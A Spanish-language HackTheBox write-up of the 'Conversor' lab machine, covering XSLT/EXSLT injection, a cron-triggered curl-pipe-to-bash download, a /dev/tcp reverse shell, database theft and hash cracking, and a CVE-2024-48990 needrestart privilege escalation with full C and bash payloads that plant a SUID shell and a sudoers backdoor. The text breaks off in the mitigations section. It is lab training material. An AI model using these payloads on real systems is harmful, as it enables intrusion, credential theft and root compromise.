@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Conversor | ZsZsec</title>
+<meta content="Cadena web a root con XSLT/EXSLT, análisis de código, cron inseguro, credenciales y escalada mediante needrestart/PYTHONPATH." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>Conversor<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox / XSLT / EXSLT</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span><span class="tag">XSLT</span><span class="tag">EXSLT</span><span class="tag">Linux</span><span class="tag">Privilege Escalation</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body"><hr/>
+<p>tags:</p>
+<ul>
+<li>xml</li>
+<li>XLST</li>
+<li>EXSLT</li>
+<li>needrestart</li>
+<li>CVE-2024-48990</li>
+<li>Python_Path_Hijacking</li>
+</ul>
+<hr/>
+<h1>Introduccion</h1>
+<p>El objetivo de esta máquina fue comprometer un servidor web vulnerable que implementaba un conversor XML/XSLT. Durante el proceso, se identificaron múltiples fallos de configuración y vulnerabilidades críticas que permitieron obtener ejecución remota de código, movimiento lateral y finalmente escalada de privilegios hasta root.</p>
+<p>El flujo completo de compromiso incluye:</p>
+<ol>
+<li><strong>Reconocimiento externo</strong> → Identificación de servicios expuestos</li>
+<li><strong>Explotación de XSLT Injection</strong> → Escritura arbitraria de archivos</li>
+<li><strong>Abuso de cron job inseguro</strong> → Ejecución automática de payload</li>
+<li><strong>Acceso inicial como www-data</strong></li>
+<li><strong>Exfiltración de base de datos y crackeo de contraseñas</strong></li>
+<li><strong>Acceso persistente vía SSH como usuario local</strong></li>
+<li><strong>Escalada de privilegios mediante CVE-2024-48990 (needrestart)</strong></li>
+<li><strong>Obtención de privilegios root</strong></li>
+</ol>
+<p>La máquina combina fallos reales que suelen encontrarse en entornos empresariales mal configurados: malas prácticas de desarrollo, servicios automatizados inseguros y una escalada de privilegios moderna basada en vulnerabilidades recientes.</p>
+<h1>Reconocimiento</h1>
+<p>Empiezo con un escaneo de nmap para intentar identificar los puertos y servicios que estan corriendo internamente en la direccion ip de la maquina victima</p>
+<pre><code class="language-bash">Nmap 7.95 scan initiated Sat Nov  1 10:05:56 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -p- --min-rate 3500 -Pn -oN nmap.txt conversor.htb
+Warning: 10.10.11.92 giving up on port because retransmission cap hit (10).
+Nmap scan report for conversor.htb (10.10.11.92)
+Host is up (0.11s latency).
+Scanned at 2025-11-01 10:05:57 EDT for 73s
+Not shown: 63130 closed tcp ports (reset), 2403 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
+|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+| http-title: Login
+|_Requested resource was /login
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read from /usr/share/nmap: nmap-protocols nmap-service-probes nmap-services.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Nov  1 10:07:10 2025 -- 1 IP address (1 host up) scanned in 73.62 seconds
+</code></pre>
+<p>Tenemos dos puertos abiertos corriendo diferentes servicios <code>SSH:22 Apache:80</code> y nos intenta resolver a el dominio <code>conversor.htb</code> asi que mi siguiente paso fue agregar ese dominio a mi archivo <code>etc/hosts</code></p>
+<h1>Exploitation</h1>
+<p>Mi siguiente paso fue dirigirme a el servidor web de la maquina victima para intentar identificar posibles vulnerabilidades web que pueda explotar para tener accesso a la maquina</p>
+<p><img alt="Pasted image 20251101100631" src="https://github.com/user-attachments/assets/a5dff442-7be3-44f0-ac01-e160bbb7b1ff"/></p>
+<p>al entrar a la url me redirecciona al directorio <code>/login</code> pero al ver que me puedo crear una cuenta pues me creo una.</p>
+<p>Ya una vez logueado tenemos lo siguiente</p>
+<p><img alt="Pasted image 20251101100748" src="https://github.com/user-attachments/assets/5b595762-972c-4a9a-8f17-0e453d83e61a"/></p>
+<p>El servidor web nos permite subir archivos <code>XML</code> y <code>XSLT</code></p>
+<h1>XLST Injection</h1>
+<h2>Analisis del codigo fuente</h2>
+<p>Navegando por la aplicación web, descubrí un archivo comprimido disponible públicamente en <code>http://conversor.htb/static/source_code.tar.gz</code>. Después de descargarlo y extraer su contenido, procedí a realizar un análisis exhaustivo del código buscando posibles vectores de ataque.</p>
+<h2>Descubrimiento Crítico: Tarea Automatizada</h2>
+<p>Dentro del archivo <code>install.md</code> encontré una configuración que inmediatamente llamó mi atención:</p>
+<pre><code class="language-bash">If you want to run Python scripts (for example, our server deletes all files old...)
+***** www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f" ""
+</code></pre>
+<p>Este fragmento describe un <strong>cron job</strong> que se ejecuta automáticamente en el servidor. Analicemos su comportamiento:</p>
+<ul>
+<li><strong>Frecuencia de ejecución:</strong> Los cinco asteriscos (<code>*****</code>) indican que la tarea se ejecuta cada minuto sin interrupción</li>
+<li><strong>Usuario:</strong> Se ejecuta bajo el contexto del usuario <code>www-data</code> (típicamente el usuario del servidor web)</li>
+<li><strong>Acción:</strong> Busca recursivamente cualquier archivo Python (<code>.py</code>) dentro de <code>/var/www/conversor.htb/scripts/</code> y lo ejecuta</li>
+</ul>
+<h3>Implicación para la Seguridad</h3>
+<p>Esta configuración es <strong>extremadamente peligrosa</strong>. Si un atacante logra colocar un archivo Python malicioso en ese directorio, el sistema lo ejecutará automáticamente dentro de los próximos 60 segundos, sin ningún tipo de validación o restricción.</p>
+<p><strong>Objetivo identificado:</strong> Necesitamos encontrar una forma de escribir un archivo <code>.py</code> en <code>/var/www/conversor.htb/scripts/</code>.</p>
+<h2>Identificando el Vector de Ataque</h2>
+<p>Examinando el código de la aplicación web (<code>app.py</code>), encontramos un endpoint interesante en <code>/convert</code>:</p>
+<pre><code class="language-python">def convert():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    xml_file = request.files['xml_file']
+    xslt_file = request.files['xslt_file']
+    from lxml import etree
+    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
+    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
+    xml_file.save(xml_path)
+    xslt_file.save(xslt_path)
+    try:
+        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
+        xml_tree = etree.parse(xml_path, parser)
+        xslt_tree = etree.parse(xslt_path)
+        transform = etree.XSLT(xslt_tree)
+        result_tree = transform(xml_tree)
+        result_html = str(result_tree)
+        file_id = str(uuid.uuid4())
+        filename = f"{file_id}.html"
+        html_path = os.path.join(UPLOAD_FOLDER, filename)
+        with open(html_path, "w") as f:
+            f.write(result_html)
+        conn = get_db()
+        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
+        conn.commit()
+        conn.close()
+        return redirect(url_for('index'))
+    except Exception as e:
+        return f"Error: {e}"
+</code></pre>
+<h3>¿Qué Hace Esta Función?</h3>
+<p>La función <code>convert()</code> implementa un conversor XML-to-HTML usando transformaciones XSLT:</p>
+<ol>
+<li><strong>Verifica autenticación:</strong> Comprueba que el usuario tenga una sesión activa</li>
+<li><strong>Recibe dos archivos:</strong> Un documento XML y una hoja de estilos XSLT</li>
+<li><strong>Los guarda temporalmente</strong> en el directorio de uploads</li>
+<li><strong>Procesa el XML:</strong> Nota que el parser XML tiene protecciones (sin entidades externas, sin red, sin DTD)</li>
+<li><strong>Procesa el XSLT:</strong> Aquí está el problema - <strong>no hay protecciones para el archivo XSLT</strong></li>
+<li><strong>Ejecuta la transformación:</strong> Aplica el XSLT sobre el XML</li>
+<li><strong>Guarda el resultado:</strong> Almacena el HTML generado</li>
+</ol>
+<h3>La Falla de Seguridad</h3>
+<p>Observa la diferencia en el tratamiento de los archivos:</p>
+<pre><code class="language-python"># XML: Parser con múltiples protecciones
+parser = etree.XMLParser(resolve_entities=False, no_network=True, 
+                         dtd_validation=False, load_dtd=False)
+xml_tree = etree.parse(xml_path, parser)
+
+# XSLT: Sin ninguna protección
+xslt_tree = etree.parse(xslt_path)  # ← Vulnerable
+</code></pre>
+<p>El archivo XSLT se procesa <strong>sin restricciones de seguridad</strong>, lo que nos permite inyectar código malicioso a través de él.</p>
+<h2>Entendiendo la Vulnerabilidad: XSLT Injection</h2>
+<h3>¿Qué es XSLT?</h3>
+<p>XSLT es más que un simple formato de transformación - es un <strong>lenguaje de programación completo</strong> disfrazado de XML. Permite no solo transformar datos, sino que tambien nos permite realizar operaciones complejas.</p>
+<ul>
+<li>Realizar operaciones lógicas (if, choose, for-each)</li>
+<li>Manipular cadenas y números</li>
+<li>Llamar funciones externas</li>
+<li>Y crucialmente: <strong>interactuar con el sistema de archivos</strong></li>
+</ul>
+<h3>El Componente Vulnerable: EXSLT Extensions</h3>
+<p>La implementación de <code>lxml</code> utiliza la biblioteca <code>libxml2</code>, que incluye soporte para <strong>EXSLT</strong> (Extended XSLT). EXSLT añade funcionalidades adicionales que no están en el estándar básico de XSLT.</p>
+<p>Una de estas extensiones es el <strong>namespace <code>exslt:common</code></strong>, que proporciona el elemento <code>&lt;exsl:document&gt;</code>.</p>
+<h3>El Elemento <code>&lt;exsl:document&gt;</code></h3>
+<p>Este elemento fue diseñado legítimamente para casos donde una transformación XSLT necesita generar múltiples archivos de salida. Por ejemplo, dividir un libro XML en múltiples páginas HTML.</p>
+<pre><code class="language-xml">&lt;exsl:document href="ruta/archivo.html"&gt;
+    &lt;!-- Contenido a escribir --&gt;
+&lt;/exsl:document&gt;
+</code></pre>
+<h3>La Vulnerabilidad</h3>
+<p>El problema está en el atributo <code>href</code>:</p>
+<ul>
+<li><strong>Acepta rutas absolutas:</strong> Podemos especificar <code>/var/www/conversor.htb/scripts/shell.py</code></li>
+<li><strong>Sin validación:</strong> No hay sanitización de la ruta</li>
+<li><strong>Permisos heredados:</strong> La escritura se hace con los permisos de <code>www-data</code></li>
+<li><strong>Contenido arbitrario:</strong> Podemos escribir cualquier contenido dentro del elemento</li>
+</ul>
+<p>Esto nos da una <strong>primitiva de escritura de archivos arbitraria</strong>.</p>
+<h2>Cadena de Explotación Completa</h2>
+<ol>
+<li><strong>Punto de entrada:</strong> Endpoint <code>/convert</code> que procesa XSLT controlado por el atacante</li>
+<li><strong>Primitiva de escritura:</strong> <code>&lt;exsl:document&gt;</code> nos permite escribir archivos arbitrarios</li>
+<li><strong>Destino:</strong> Directorio <code>/var/www/conversor.htb/scripts/</code> (escribible por <code>www-data</code>)</li>
+<li><strong>Trigger automático:</strong> Cron job que ejecuta cualquier <code>.py</code> cada minuto</li>
+<li><strong>Resultado:</strong> Shell reversa o backdoor ejecutándose como <code>www-data</code></li>
+</ol>
+<h1>Explotación: Obteniendo Shell como www-data</h1>
+<p>Con la vulnerabilidad identificada, procedí a construir el exploit para obtener acceso al servidor.</p>
+<h2>Preparación del Entorno de Ataque</h2>
+<h3>1. Creando el Script de Reverse Shell</h3>
+<p>Primero, preparé un script bash simple que establecería la conexión reversa:</p>
+<pre><code class="language-bash">sh -i &gt;&amp; /dev/tcp/10.10.16.26/8555 0&gt;&amp;1
+</code></pre>
+<h3>Crafting del Payload XSLT</h3>
+<p>Creé el archivo <code>josu.xlst</code> con el siguiente contenido:</p>
+<pre><code class="language-xml">┌──(zikuta㉿kali)-[~]
+└─$ cat josu.xlst
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet
+    version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:exsl="http://exslt.org/common"
+    extension-element-prefixes="exsl"&gt;
+    &lt;xsl:template match="/"&gt;
+        &lt;exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;&lt;![CDATA[
+import os
+os.system("curl http://10.10.16.26:8081/shell.sh | bash")
+]]&gt;&lt;/exsl:document&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+<p><strong>Desglose del payload:</strong></p>
+<ul>
+<li><code>xmlns:exsl="http://exslt.org/common"</code>: Declara el namespace EXSLT que nos da acceso a funciones extendidas</li>
+<li><code>extension-element-prefixes="exsl"</code>: Habilita el uso de elementos del namespace EXSLT</li>
+<li><code>&lt;xsl:template match="/"&gt;</code>: Coincide con el nodo raíz del XML (se ejecutará siempre)</li>
+<li><code>&lt;exsl:document href="/var/www/conversor.htb/scripts/shell.py"&gt;</code>: Aquí está la magia - escribe en la ruta absoluta especificada</li>
+<li><code>method="text"</code>: Indica que el contenido debe escribirse como texto plano (no XML)</li>
+<li><code>&lt;![CDATA[...]]&gt;</code>: Permite escribir código Python sin que los caracteres especiales interfieran con el XML</li>
+</ul>
+<p>El código Python resultante:</p>
+<pre><code class="language-python">import os
+os.system("curl http://10.10.16.26:8081/shell.sh | bash")
+</code></pre>
+<p>Este código:</p>
+<ol>
+<li>Descarga el script <code>shell.sh</code> desde mi servidor HTTP</li>
+<li>Lo pasa directamente a <code>bash</code> mediante un pipe</li>
+<li>Bash ejecuta la reverse shell</li>
+</ol>
+<h3>Levantando el Servidor HTTP</h3>
+<p>Para servir el script <code>shell.sh</code>, inicié un servidor HTTP simple en el puerto 8081:</p>
+<pre><code class="language-bash">┌──(zikuta㉿kali)-[~]
+└─$ python3 -m http.server 8081 
+Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+</code></pre>
+<h2>Configuración de Listeners</h2>
+<h3>4. Listener para la Reverse Shell</h3>
+<p>En otra terminal, configuré un listener con la herramienta <code>penelope</code> esperando la conexión en el puerto <code>8555</code>:</p>
+<pre><code class="language-bash">┌──(zikuta㉿kali)-[~]
+└─$ penelope -p 8555
+[+] Listening for reverse shells on 0.0.0.0:8555 →  127.0.0.1 • 172.17.0.1 • 10.10.14.105
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from conversor~10.10.11.92-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully using /usr/bin/python3! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/zikuta/.penelope/sessions/conversor~10.10.11.92-Linux-x86_64/2025_11_02-08_41_02-416.log 📜
+</code></pre>
+<p>Tenemos una reverse shell como el usuario <code>www-data</code></p>
+<h2>Enumeración del Sistema</h2>
+<p>Con acceso como <code>www-data</code>, comencé la fase de enumeración post-explotación para identificar posibles vías de escalada de privilegios o movimiento lateral.</p>
+<p>Revisé el archivo <code>/etc/passwd</code> para identificar usuarios con shell interactiva y logre identificar un usuario llamado <code>fismathack</code></p>
+<p><strong>Usuario objetivo identificado:</strong> <code>fismathack</code> (UID 1000, usuario estándar del sistema)</p>
+<h2>Extracción de la Base de Datos</h2>
+<p>Recordando el análisis del código fuente, sabía que la aplicación utilizaba SQLite para almacenar información de usuarios. Decidí buscar esta base de datos.</p>
+<pre><code class="language-bash">www-data@conversor:~/conversor.htb$ cd instance
+www-data@conversor:~/conversor.htb/instance$ ls
+users.db
+</code></pre>
+<p><strong>Archivo encontrado:</strong> <code>users.db</code> - Base de datos SQLite que probablemente contiene credenciales</p>
+<h3>Exfiltrando la Base de Datos</h3>
+<p>Para analizar la base de datos con más comodidad, decidí transferirla a mi máquina atacante. Levanté un servidor HTTP en la máquina víctima:</p>
+<pre><code class="language-bash">www-data@conversor:~/conversor.htb/instance$ python3 -m http.server 9001
+Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
+10.10.14.105 - - [02/Nov/2025 13:42:24] "GET / HTTP/1.1" 200 -
+10.10.14.105 - - [02/Nov/2025 13:42:24] code 404, message File not found
+10.10.14.105 - - [02/Nov/2025 13:42:24] "GET /favicon.ico HTTP/1.1" 404 -
+10.10.14.105 - - [02/Nov/2025 13:42:26] "GET /users.db HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+www-data@conversor:~/conversor.htb/instance$ 
+</code></pre>
+<p>Despues en mi maquina lo abri con sqlite para explorar la base de datos y me encontre con todas las contrasenas de los usuarios en formato <code>hash MD5</code></p>
+<p><img alt="Pasted image 20251102084639" src="https://github.com/user-attachments/assets/5d961367-7c75-4e07-9e49-0038bbc6342c"/></p>
+<h3>John</h3>
+<p>Procedo a intentar <code>crackear</code> la contrasena del usuario <code>fismathack</code> con la herramienta <code>john the ripper</code></p>
+<p><img alt="Pasted image 20251102084755" src="https://github.com/user-attachments/assets/d97616ca-00ca-489e-8c00-0f1d01dca50e"/></p>
+<pre><code>fismathack:Keepmesafeandwarm</code></pre>
+<h2>Acceso Legítimo via SSH</h2>
+<p>Recordando el escaneo inicial con Nmap, sabía que el puerto 22 (SSH) estaba abierto. Con credenciales válidas, procedí a conectarme:</p>
+<pre><code class="language-bash">Last login: Sun Nov 2 13:49:25 2025 from 10.10.14.105
+fismathack@conversor:~$ ls
+user.txt
+</code></pre>
+<p>Y obtuve la primera flag!!</p>
+<h2>Enumeración de Privilegios Sudo</h2>
+<p>Una vez dentro del sistema como <code>fismathack</code>, lo primero que hice fue verificar qué comandos podía ejecutar con privilegios elevados:</p>
+<pre><code class="language-bash">fismathack@conversor:~$ sudo -l
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
+</code></pre>
+<h3>Análisis del Resultado</h3>
+<p><strong>Hallazgo crítico:</strong> El usuario <code>fismathack</code> puede ejecutar <code>/usr/sbin/needrestart</code> como root sin necesidad de contraseña.</p>
+<p>Desglosemos los permisos:</p>
+<ul>
+<li><code>(ALL : ALL)</code>: Podemos ejecutar el comando como cualquier usuario y grupo, incluyendo root</li>
+<li><code>NOPASSWD</code>: No se requiere ingresar contraseña</li>
+<li><code>/usr/sbin/needrestart</code>: Es el único binario que podemos ejecutar con estos privilegios</li>
+</ul>
+<h2>Investigando needrestart</h2>
+<h3>¿Qué es needrestart?</h3>
+<p><code>needrestart</code> es una herramienta de administración de sistemas Linux que:</p>
+<ul>
+<li>Escanea todos los procesos en ejecución</li>
+<li>Identifica servicios que están usando bibliotecas desactualizadas</li>
+<li>Determina qué servicios necesitan ser reiniciados después de una actualización del sistema</li>
+</ul>
+<p>Es común en sistemas Ubuntu/Debian y <strong>típicamente se ejecuta con privilegios de root</strong> para poder inspeccionar todos los procesos del sistema.</p>
+<p><strong>Verificando version instalada</strong></p>
+<pre><code class="language-bash">fismathack@conversor:~$ /usr/sbin/needrestart -v
+[main] needrestart v3.7
+[main] eval /etc/needrestart/needrestart.conf
+[main] Using UI 'NeedRestart::UI::stdio'
+</code></pre>
+<p><strong>Versión vulnerable</strong>: needrestart 3.7 - susceptible a CVE-2024-48990.</p>
+<h1><strong>Privilege Escalation via CVE-2024-48990</strong></h1>
+<p><strong>Vulnerabilidad</strong>: CVE-2024-48990 - PYTHONPATH Hijacking en needrestart<br/>
+<strong>Severidad</strong>: Alto (7.8 CVSS)<br/>
+<strong>Impacto</strong>: Escalada de privilegios de usuario normal a root<br/>
+<strong>Binario afectado</strong>: <code>/usr/sbin/needrestart</code> v3.7</p>
+<h2>Entendiendo la Vulnerabilidad:</h2>
+<p>CVE-2024-48990 Esta vulnerabilidad es un ejemplo perfecto de cómo características legítimas pueden convertirse en vectores de ataque cuando no se validan correctamente las entradas del usuario.</p>
+<h3>El Problema en Lenguaje Simple</h3>
+<p>Imagina esta situación:</p>
+<ol>
+<li><strong>Tú</strong> (como usuario normal) inicias un programa Python</li>
+<li>Antes de iniciarlo, configuras una variable de entorno llamada <code>PYTHONPATH</code> que le dice a Python: "busca módulos primero en esta carpeta que yo controlo"</li>
+<li>Tu programa Python se queda ejecutando en segundo plano</li>
+<li>Luego ejecutas <code>sudo needrestart</code> (como root)</li>
+<li><code>needrestart</code> ve tu programa Python y piensa: "necesito inspeccionarlo para ver qué bibliotecas usa"</li>
+<li>Para inspeccionar un programa Python, <code>needrestart</code> necesita <strong>ejecutar código Python él mismo</strong></li>
+<li><strong>Aquí está el fallo:</strong> Cuando <code>needrestart</code> (que ahora es root) ejecuta Python para inspeccionar tu proceso, <strong>hereda tu PYTHONPATH malicioso</strong></li>
+<li>Cuando intenta importar módulos Python estándar como <code>importlib</code>, Python busca primero en tu carpeta maliciosa</li>
+<li>Tú has colocado un módulo falso en esa carpeta con código malicioso</li>
+<li>Python (ejecutando como root) carga y ejecuta tu código malicioso</li>
+</ol>
+<h1>Escalada de Privilegios CVE-2024-48990 NeedRestart</h1>
+<h2><strong>¿Por qué needrestart es vulnerable?</strong></h2>
+<p>El programa <em>needrestart</em>, al ejecutarse como root vía sudo, analiza todos los procesos del sistema para detectar bibliotecas desactualizadas.</p>
+<p>Cuando encuentra un proceso de Python, intenta inspeccionar su entorno <strong>importando módulos de Python</strong>, como <code>importlib</code>.</p>
+<p>El problema:</p>
+<blockquote>
+<p>needrestart <strong>hereda las variables de entorno del proceso analizado</strong>, incluyendo <strong>PYTHONPATH</strong>.</p>
+</blockquote>
+<p>Esto significa que:</p>
+<ul>
+<li>Si el proceso que needrestart inspecciona está ejecutándose con un <strong>PYTHONPATH modificado por un atacante</strong>,</li>
+<li>entonces <strong>needrestart (root)</strong> usará ese PYTHONPATH,</li>
+<li>y Python cargará <strong>módulos maliciosos</strong> creados por el atacante,</li>
+<li>ejecutando código arbitrario <strong>como root</strong>.</li>
+</ul>
+<p>Este es el núcleo del exploit.</p>
+<h1><strong>Construcción del payload malicioso (<code>__init__.so</code>)</strong></h1>
+<p>Primero creamos un archivo en C (<strong>lib.c</strong>) que actuará como el módulo malicioso que Python cargará con permisos de root:</p>
+<pre><code class="language-c++">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+/* This is a GCC attribute that marks 'a()' as a constructor. */
+/* This function will run AUTOMATICALLY when the library is loaded. */
+static void a() __attribute__((constructor));
+
+void a() {
+    /* Only run if we are root */
+    if(geteuid() == 0) { 
+        setuid(0);
+        setgid(0);
+        
+        /* The payload:
+           1. Copy the bash shell to /tmp/poc
+           2. Make /tmp/poc a SUID binary (owned by root, runs as root)
+           3. Add a sudoers rule as a backup persistence method
+        */
+        const char *shell = "cp /bin/sh /tmp/poc; "
+                            "chmod u+s /tmp/poc; "
+                            "grep -qxF 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' /etc/sudoers || "
+                            "echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' &gt;&gt; /etc/sudoers";
+        system(shell);
+    }
+}
+</code></pre>
+<p>Este payload hace tres cosas al cargarse como root:</p>
+<ol>
+<li>Copia <code>/bin/sh</code> a <code>/tmp/poc</code></li>
+<li>Le establece el bit SUID → shell de root</li>
+<li>Añade una regla a <code>/etc/sudoers</code> que permite ejecutar <code>/tmp/poc</code> sin contraseña</li>
+</ol>
+<p>Luego lo compilamos como una librería compartida de Python:</p>
+<pre><code class="language-bash">gcc -shared -fPIC -o __init__.so lib.c  
+</code></pre>
+<p>Este archivo (<code>__init__.so</code>) será el módulo malicioso que Python cargará.</p>
+<h1><strong>Preparación del ataque en la máquina víctima</strong></h1>
+<p>Creamos un script en Bash que automatiza toda la explotación:</p>
+<pre><code class="language-bash">#!/bin/bash
+set -e
+cd /tmp
+
+# 1. Create the malicious module directory structure
+mkdir -p malicious/importlib
+
+# 2. Download our compiled C payload from our attacker server
+#    (Replace 10.10.14.81 with your attacker IP)
+curl http://10.10.15.237:8080/__init__.so -o /tmp/malicious/importlib/__init__.so
+
+# 3. Create the "bait" Python script (e.py)
+#    This script just loops, waiting for the exploit to work
+cat &lt;&lt; 'EOF' &gt; /tmp/malicious/e.py
+import time
+import os
+
+while True:
+    try:
+        import importlib
+    except:
+        pass
+    
+    # When our C payload runs, it creates /tmp/poc
+    # This loop waits for that file to exist
+    if os.path.exists("/tmp/poc"):
+        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
+        # The C payload also added a sudoers rule.
+        # We use that rule to pop our root shell.
+        os.system("sudo /tmp/poc -p")
+        break
+    time.sleep(1)
+EOF
+
+# 4. This is the magic!
+#    Run the bait script (e.py) with the PYTHONPATH hijacked.
+#    This process will just sit here, waiting for needrestart to scan it.
+echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
+cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2&gt;/dev/null
+</code></pre>
+<p><strong>¿Qué hace este script?</strong></p>
+<p>Crea una estructura de módulo falsa:</p>
+<pre><code class="language-bash">/tmp/malicious/importlib/__init__.so
+</code></pre>
+<p>de forma que Python piense que nuestro archivo es el módulo legítimo <code>importlib</code>.</p>
+<ol start="2">
+<li><strong>Descarga la librería maliciosa</strong> compilada en nuestra máquina atacante.</li>
+<li><strong>Ejecuta un script en Python (<code>e.py</code>) con un PYTHONPATH controlado por nosotros.</strong></li>
+</ol>
+<p>Este proceso se queda activo, esperando a que needrestart lo analice.</p>
+<ol start="4">
+<li>Cuando needrestart escanee este proceso (porque el usuario lo ejecutará luego con sudo), heredará el entorno de <code>e.py</code>.</li>
+<li>Al intentar importar <code>importlib</code>, Python cargará <strong>nuestro módulo malicioso</strong>.</li>
+<li>El payload se ejecutará <strong>como root</strong>, creando <code>/tmp/poc</code>.</li>
+<li><code>e.py</code> detecta que <code>/tmp/poc</code> existe → lanza una shell de root:</li>
+</ol>
+<pre><code class="language-bash">sudo /tmp/poc -p
+</code></pre>
+<h1>Ejecución final del exploit</h1>
+<p>Abrimos <strong>otro terminal</strong> y simplemente ejecutamos:</p>
+<pre><code class="language-bash">sudo /usr/sbin/needrestart
+</code></pre>
+<p>Cuando needrestart analiza el proceso Python del script, carga nuestro módulo malicioso y ejecuta el payload.</p>
+<p><img alt="Pasted image 20251119111138" src="https://github.com/user-attachments/assets/4f03fbfd-edca-46aa-83fa-b39ad442a3b7"/></p>
+<h1>Flujo del Ataque</h1>
+<pre><code class="language-kotlin">┌─────────────────────────────┐
+│        Reconocimiento       │
+│ Nmap → Puertos 22, 80       │
+└──────────────┬──────────────┘
+               │
+               ▼
+┌─────────────────────────────┐
+│    Análisis de la WebApp    │
+│ Subida de XML/XSLT          │
+│ Descarga del source_code    │
+└──────────────┬──────────────┘
+               │
+               ▼
+┌─────────────────────────────┐
+│     Descubrimiento clave    │
+│ Cron job ejecuta .py cada   │
+│ 1 minuto como www-data      │
+└──────────────┬──────────────┘
+               │
+               ▼
+┌──────────────────────────────┐
+│     XSLT Injection           │
+│ EXSLT &lt;exsl:document&gt; →      │
+│ Escritura arbitraria de .py  │
+│ en /var/www/.../scripts/     │
+└───────────────┬──────────────┘
+                │
+                ▼
+┌──────────────────────────────┐
+│   Ejecución automática       │
+│ Cron job ejecuta shell.py    │
+│ Reverse shell como www-data  │
+└───────────────┬──────────────┘
+                │
+                ▼
+┌──────────────────────────────┐
+│   Enumeración Interna        │
+│ users.db → hashes MD5        │
+│ Crackeo con John             │
+└───────────────┬──────────────┘
+                │
+                ▼
+┌──────────────────────────────┐
+│      SSH con credenciales    │
+│   Usuario: fismathack        │
+└───────────────┬──────────────┘
+                │
+                ▼
+┌──────────────────────────────┐
+│  Escalada de Privilegios     │
+│ CVE-2024-48990 Needrestart   │
+│ Hijacking de PYTHONPATH      │
+│ Carga de módulo malicioso    │
+│ Ejecución como root          │
+└───────────────┬──────────────┘
+                │
+                ▼
+┌──────────────────────────────┐
+│            ROOT              │
+└──────────────────────────────┘
+</code></pre>
+<h1><strong>Mitigaciones</strong></h1>
+<p>Incluye esto en tu writeup porque demuestra entendimiento de seguridad real.</p>
+<h2><strong>1. Restringir el procesado XSLT</strong></h2>
+<ul>
+<li>Deshabilitar EXSLT por completo en lxml</li>
+<li>Habilitar modo seguro:</li>
+</ul>
+<pre><code class="language-bash">etree.XSLT(xslt_tree, access_control=etree.XSLTAccessControl.DENY_ALL)
+</code></pre>
+<ul>
+<li>Bloquear elementos peligrosos como <code>exsl:document</code></li>
+</ul>
+<h2><strong>2. Nunca ejecutar archivos cargados por el usuario</strong></h2>
+<ul>
+<li><p>El cron job es el fallo más grave<br/>
+Solución:</p>
+<ul>
+<li>No ejecutar scripts de un directorio escribible por www-data</li>
+<li>Validar contenido antes de ejecutar cualquier script</li>
+<li>Mover la ejecución a un usuario sin privilegios</li>
+</ul>
+</li>
+</ul>
+<h2><strong>Almacenar contraseñas con hashing seguro</strong></h2>
